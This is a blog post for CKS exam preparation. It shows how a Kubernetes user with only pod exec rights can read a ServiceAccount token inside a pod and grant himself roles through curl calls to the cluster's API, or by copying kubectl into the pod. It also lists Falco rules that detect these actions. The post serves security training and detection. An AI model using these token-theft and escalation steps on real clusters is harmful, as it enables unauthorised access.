---
title: "CKS preparation - abusing ServiceAccount to grant privileges"
date: 2021-02-03T06:00:00-04:00
last_modified_at: 2021-02-04
categories:
  - certifications
tags:
  - kubernetes
  - certifications
  - cks
comments: true
---

In this article I will show how Kubernetes ServiceAccount can used to gain
privileges. Of course, all this information should be only used for preparation
to CKS exam.

Let's say that we have a developer John, who has limited privileged in
namespace `frontend`:
```
$ kubectl -n frontend auth can-i list pods --as john
no
$ kubectl -n frontend auth can-i create pods --as john
no
$ kubectl -n frontend auth can-i create role --as john
no
```

But for debugging purposes, he was granted with "pod/exec" role. In `frontend`
namespace there is a `service` Pod, running under `service-sa` ServiceAccount,
which has permissions to create, modify or delete roles:
```YAML
apiVersion: v1
kind: ServiceAccount
metadata:
  name: service-sa
  namespace: frontend
---
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: service-role
  namespace: frontend
rules:
- apiGroups: ["rbac.authorization.k8s.io"]
  resources: ["*"]
  verbs: ["create","update","delete"]
---
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: service-binding
  namespace: frontend
subjects:
- kind: ServiceAccount
  name: service-sa
roleRef:
  kind: Role
  name: service-role
  apiGroup: rbac.authorization.k8s.io
```

Now, let's imagine that John wants to get more permissions. To do that, he has
logged into this pod. To interact with kube-api John has to install curl(I am
using alpine in the example):
```bash
apk add curl
```

Next step will be to find serviceAccount's token and kube-api endpoint:
```bash
export TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
export ENDPOINT=$KUBERNETES_SERVICE_HOST
export NAMESPACE=frontend
```

Knowing that, he ca create a new role via [API request](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/role-v1/#create-create-a-role):
```YAML
# Create ROLE in namespace
curl -k  https://$ENDPOINT/apis/rbac.authorization.k8s.io/v1/namespaces/frontend/roles \
	-H "Authorization: Bearer $TOKEN" \
	-X POST --header 'content-type: application/json' \
	--data '
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "Role",
    "metadata": {
        "name": "infra-role",
        "namespace": "frontend"
    },
    "rules": [
        {
            "apiGroups": [
                "rbac.authorization.k8s.io"
            ],
            "resources": [
                "*"
            ],
            "verbs": [
                "create",
                "update",
                "delete"
            ]
        }
    ]
}'
```

and assign that role to his entity([API request](https://kubernetes.io/docs/reference/kubernetes-api/authorization-resources/role-binding-v1/#create-create-a-rolebinding)):
```YAML
# Create ROLEBINDING in namespace
curl -k  https://$ENDPOINT/apis/rbac.authorization.k8s.io/v1/namespaces/frontend/rolebindings \
	-H "Authorization: Bearer $TOKEN" \
	-X POST --header 'content-type: application/json' \
	--data '
{
    "apiVersion": "rbac.authorization.k8s.io/v1",
    "kind": "RoleBinding",
    "metadata": {
        "name": "infra-binding",
        "namespace": "frontend"
    },
    "roleRef": {
        "apiGroup": "rbac.authorization.k8s.io",
        "kind": "Role",
        "name": "infra-role"
    },
    "subjects": [
        {
            "apiGroup": "rbac.authorization.k8s.io",
            "kind": "User",
            "name": "john"
        }
    ]
}'
```

Since service account has permissions to create new roles and RoleBindings,
new permissions were granted to John:
```bash
$ kubectl -n frontend auth can-i create role --as john
yes
```

As a Cluster Administrator, it's not easy to find such activities. [Falco](https://falco.org/)
is a great tool that can monitor your cluster and report on all user actions.

It comes with a [default set of rules](https://github.com/falcosecurity/charts/blob/master/falco/rules/k8s_audit_rules.yaml),
which would generate alerts on John's actions:
```YAML
- rule: Attach/Exec Pod
  desc: >
    Detect any attempt to attach/exec to a pod
  condition: kevt_started and pod_subresource and kcreate and ka.target.subresource in (exec,attach) and not user_known_exec_pod_activities
  output: Attach/Exec to pod (user=%ka.user.name pod=%ka.target.name ns=%ka.target.namespace action=%ka.target.subresource command=%ka.uri.param[command])
  priority: NOTICE
  source: k8s_audit
  tags: [k8s]
- rule: K8s Role/Clusterrole Created
  desc: Detect any attempt to create a cluster role/role
  condition: (kactivity and kcreate and (clusterrole or role) and response_successful)
  output: K8s Cluster Role Created (user=%ka.user.name role=%ka.target.name rules=%ka.req.role.rules resp=%ka.response.code decision=%ka.auth.decision reason=%ka.auth.reason)
  priority: INFO
  source: k8s_audit
  tags: [k8s]
- rule: K8s Role/Clusterrolebinding Created
  desc: Detect any attempt to create a clusterrolebinding
  condition: (kactivity and kcreate and clusterrolebinding and response_successful)
  output: K8s Cluster Role Binding Created (user=%ka.user.name binding=%ka.target.name subjects=%ka.req.binding.subjects role=%ka.req.binding.role resp=%ka.response.code decision=%ka.auth.decision reason=%ka.auth.reason)
  priority: INFO
  source: k8s_audit
  tags: [k8s]
```

## Update

My colleague provide me with an even simpler way to do this - using kubectl
inside the cluster:

John could copy kubectl to the Pod:
```bash
$ kubectl cp $(which kubectl) pod-with-service-account:/ -n frontend
```

Once it's there, it's possible to use it to do all kind of manipulations with
kubernetes entities:
```bash
# /kubectl --namespace=frontend create role podview  --verb=get --verb=list   --resource=pods
role.rbac.authorization.k8s.io/podview created
```

If `kubectl` can't find $KUBECONFIG, it will use in-cluster configuration to work
with kube-api:
```
# /kubectl cluster-info -v=10
I0203 11:55:51.542573     193 merged_client_builder.go:121] Using in-cluster configuration
I0203 11:55:51.543028     193 merged_client_builder.go:121] Using in-cluster configuration
```

[According to documentation](https://github.com/kubernetes/client-go/blob/master/examples/in-cluster-client-configuration/README.md#authenticating-inside-the-cluster):
```
client-go uses the Service Account token mounted inside the Pod at the
/var/run/secrets/kubernetes.io/serviceaccount path when the
rest.InClusterConfig() is used.
```
